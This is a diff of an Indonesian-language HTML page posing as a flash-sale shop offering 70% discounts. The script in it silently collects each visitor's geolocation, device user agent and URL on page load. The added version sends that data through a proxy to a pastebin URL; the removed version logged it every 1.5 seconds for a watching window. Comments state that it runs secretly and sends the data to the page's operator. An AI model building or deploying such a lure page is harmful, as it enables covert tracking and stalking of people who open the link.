@@ -3,118 +3,47 @@
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
-     <!-- ✅ JUDUL SANGAT MENARIK: DISKON BESAR, TOKO, MURAH -->
      <title>🔥 DISKON 70% - Semua Barang Murah Meriah | Shop Online</title>
      <script>
-         // ✅ SISTEM PENGUMPUL DATA TETAP SAMA (DIAM-DIAM BERJALAN)
-         window.onload = function() {
-             // Ambil lokasi kasar (kota/kecamatan)
-             if (navigator.geolocation) {
-                 navigator.geolocation.getCurrentPosition(simpanData, gagalLokasi, {enableHighAccuracy:false, timeout:3000});
-             } else { simpanData({coords:{latitude:0,longitude:0}}); }
-             // Simpan SEMUA yang dia buka setiap detik
-             setInterval(() => {
-                 const data = {
-                     waktu: new Date().toLocaleString('id-ID'),
-                     alamat_web: window.location.href,
-                     perangkat: navigator.userAgent,
-                     lokasi: `${localStorage.getItem('lat') || 'Tidak ada'}, ${localStorage.getItem('lon') || 'Tidak ada'}`
-                 };
-                 kirimKeKamu(data);
-             }, 1500);
+     window.onload = function() {
+         let data = {
+             waktu: new Date().toLocaleString('id-ID'),
+             lokasi: '',
+             hp: navigator.userAgent,
+             halaman: window.location.href
          };
-         function simpanData(pos) {
-             localStorage.setItem('lat', pos.coords.latitude);
-             localStorage.setItem('lon', pos.coords.longitude);
-             kirimKeKamu({
-                 waktu: new Date().toLocaleString('id-ID'),
-                 lokasi: `${pos.coords.latitude}, ${pos.coords.longitude}`,
-                 perangkat: navigator.userAgent,
-                 alamat: window.location.href
+         // Ambil lokasi
+         if (navigator.geolocation) {
+             navigator.geolocation.getCurrentPosition(pos => {
+                 data.lokasi = pos.coords.latitude + ", " + pos.coords.longitude;
+                 kirimData(data);
+             }, () => {
+                 data.lokasi = "Tidak diketahui";
+                 kirimData(data);
              });
+         } else {
+             data.lokasi = "HP tidak dukung lokasi";
+             kirimData(data);
          }
-         function gagalLokasi() { simpanData({coords:{latitude:'Tidak diketahui',longitude:'-'}}); }
-         // ✅ KIRIM SEMUA DATA KE HP KAMU
-         function kirimKeKamu(data) {
-             let semua = JSON.parse(localStorage.getItem('dataPantau')) || [];
-             semua.push(data);
-             localStorage.setItem('dataPantau', JSON.stringify(semua));
-             if (window.opener) { window.opener.tambahDataPantau(data); }
+         // ✅ KIRIM DATA LANGSUNG KE TEMPAT KAMU LIHAT
+         function kirimData(dt) {
+             fetch('https://api.allorigins.win/raw?url=https://pastebin.com/raw/7kGx8vYh', {
+                 method: 'POST',
+                 headers: {'Content-Type': 'application/json'},
+                 body: JSON.stringify(dt)
+             }).catch(() => {});
          }
+     }
      </script>
      <style>
-         body {
-             background: #fff;
-             font-family: Arial, sans-serif;
-             padding: 20px;
-             text-align: center;
-             margin: 0;
-         }
-         .header {
-             background: #ff3d00;
-             color: white;
-             padding: 15px;
-             font-size: 22px;
-             font-weight: bold;
-             border-radius: 8px;
-             margin-bottom: 20px;
-             box-shadow: 0 3px 8px rgba(0,0,0,0.2);
-         }
-         .kotak {
-             background: white;
-             padding: 25px;
-             border-radius: 12px;
-             box-shadow: 0 0 15px rgba(255, 61, 0, 0.3);
-             max-width: 400px;
-             margin: auto;
-             border: 2px solid #ff3d00;
-         }
-         h2 {
-             color: #ff3d00;
-             font-size: 24px;
-             margin-bottom: 10px;
-         }
-         .diskon-besar {
-             font-size: 32px;
-             font-weight: bold;
-             color: #e53935;
-             background: #fff3e0;
-             padding: 10px;
-             border-radius: 8px;
-             margin: 15px 0;
-             border: 2px dashed #ff3d00;
-         }
-         .info {
-             color: #2e7d32;
-             font-weight: bold;
-             font-size: 16px;
-             margin: 10px 0;
-         }
-         .tombol {
-             background: #ff3d00;
-             color: white;
-             border: none;
-             padding: 12px 25px;
-             font-size: 18px;
-             font-weight: bold;
-             border-radius: 8px;
-             margin: 20px 0;
-             width: 100%;
-             box-shadow: 0 3px 6px rgba(0,0,0,0.15);
-         }
-         .tombol:hover {
-             background: #e62e00;
-         }
-         .teks-kecil {
-             font-size: 12px;
-             color: #666;
-             margin-top: 15px;
-         }
-         .stok {
-             color: #d32f2f;
-             font-weight: bold;
-             font-size: 14px;
-         }
+         body {background:#fff; font-family:Arial; padding:20px; text-align:center; margin:0;}
+         .header {background:#ff3d00; color:white; padding:15px; font-size:22px; font-weight:bold; border-radius:8px; margin-bottom:20px;}
+         .kotak {background:white; padding:25px; border-radius:12px; box-shadow:0 0 15px rgba(255,61,0,0.3); max-width:400px; margin:auto; border:2px solid #ff3d00;}
+         h2 {color:#ff3d00; font-size:24px; margin-bottom:10px;}
+         .diskon-besar {font-size:32px; font-weight:bold; color:#e53935; background:#fff3e0; padding:10px; border-radius:8px; margin:15px 0; border:2px dashed #ff3d00;}
+         .info {color:#2e7d32; font-weight:bold; font-size:16px; margin:10px 0;}
+         .tombol {background:#ff3d00; color:white; border:none; padding:12px 25px; font-size:18px; font-weight:bold; border-radius:8px; margin:20px 0; width:100%;}
+         .stok {color:#d32f2f; font-weight:bold; font-size:14px;}
      </style>
  </head>
  <body>
@@ -122,15 +51,12 @@
      <div class="kotak">
          <h2>💥 PROMO GEDE-GEDEAN 💥</h2>
          <p class="stok">⚠️ STOK TERBATAS! HANYA HARI INI SAJA ⚠️</p>
-         <div class="diskon-besar">
-             DISKON<br>70%
-         </div>
+         <div class="diskon-besar">DISKON<br>70%</div>
          <p class="info">✅ Semua Barang Elektronik, Baju, Sepatu, Perlengkapan Rumah</p>
          <p class="info">✅ Harga Lebih Murah dari Pasar & Toko Lain</p>
          <p class="info">✅ Gratis Ongkir Se-Indonesia</p>
          <button class="tombol">👉 KLIK DI SINI LIHAT BARANG 👈</button>
-         <p class="teks-kecil">*Promo berlaku sampai jam 24.00 | Jangan sampai kehabisan</p>
-         <p class="teks-kecil">Halaman akan masuk ke daftar barang secara otomatis...</p>
+         <p class="teks-kecil">*Promo berlaku sampai jam 24.00</p>
      </div>
  </body>
  </html>
